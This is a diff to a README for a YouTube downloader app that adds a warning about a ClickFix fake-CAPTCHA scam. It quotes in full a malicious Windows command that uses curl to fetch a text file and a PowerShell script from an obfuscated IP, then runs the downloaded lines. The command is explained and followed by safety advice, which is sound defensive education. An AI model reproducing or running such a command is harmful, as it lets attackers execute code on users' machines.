@@ -14,7 +14,7 @@
 
 <br>
 
-<img src="screenshot.png" alt="YT Downloader screenshot" width="560">
+<img src="assets/screenshot.png" alt="YT Downloader screenshot" width="560">
 
 </div>
 
@@ -31,6 +31,36 @@ So I built the thing I actually wanted:
 > **One small window. One job. Nothing running when you're not using it.**
 
 That's the entire project. 🎯
+
+---
+
+## 🚨 Real talk: the trap I ran into
+
+While hunting for a downloader, one of those sites stopped me with a "verify you're human" popup. It told me to press <kbd>Win</kbd> + <kbd>R</kbd>, paste something, and hit <kbd>Enter</kbd>. The command looked like this:
+
+```bat
+:: ⚠️ MALICIOUS. DO NOT RUN THIS. Shown only as a warning.
+set "__VSCMD_WIN_64BIT=true"&& cd %tmp%& curl.exe -sLo %tmp%\check.txt 1570298128/349&& curl.exe -sLo %tmp%\Z797.ps1 1570298128/348&& for /f "delims=" %i in (check.txt) do %i
+```
+
+**This is not a captcha. It's malware.** This trick is known as **ClickFix** (or "fake CAPTCHA"). Here's what that command does:
+
+| Part of the command | What it really does |
+|---|---|
+| `cd %tmp%` | Moves into your temporary folder, a common hiding spot for malware |
+| `curl.exe ... 1570298128/349` | Downloads a text file from a remote server. The address is written as one big number to hide that it's a raw IP |
+| `curl.exe ... Z797.ps1` | Downloads a PowerShell script |
+| `for /f ... do %i` | **Executes every line of the downloaded file as a command.** The attacker decides what runs on your PC, and can change it at any time |
+
+**Rules to stay safe:**
+
+- 🛑 **No legitimate website will ever ask you to paste a command into Run, PowerShell or Terminal** to prove you're human, fix an error, or start a download.
+- 🛑 If you can't read and understand a command, don't run it.
+- 🛑 If a "download" site is covered in fake buttons, popups and captchas, close the tab.
+
+**If you already ran something like this:** disconnect from the internet, run a full Microsoft Defender scan (including **Microsoft Defender Offline scan**), and change your important passwords **from a different, clean device**. If you saved passwords or crypto wallets on that PC, treat them as compromised.
+
+> ✅ **This app will never ask you to run a command like that.** The only commands in this README are standard `git`, `python`, `pip` and `winget` ones that you can read and verify yourself.
 
 ---
 
